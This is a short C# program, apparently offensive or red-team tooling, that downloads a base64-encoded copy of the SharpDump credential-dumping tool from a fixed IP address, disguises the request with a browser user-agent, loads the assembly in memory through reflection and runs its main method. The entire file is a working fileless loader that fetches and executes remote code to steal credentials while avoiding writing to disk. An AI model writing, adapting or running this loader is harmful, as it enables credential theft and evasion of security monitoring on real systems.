using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Net;
using System.IO;

namespace ReflectionB64
{
    class Program
    {
        static void Main(string[] args)
        {
            var wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
            var a = Assembly.Load(System.Convert.FromBase64String(wc.DownloadString("http://192.168.2.114/SharpDump.exe.b64")));
            var t = a.GetType("SharpDump.Program");
            var c = Activator.CreateInstance(t);
            var m = t.GetMethod("RunMain");
            m.Invoke(c, null);
        }
    }
}
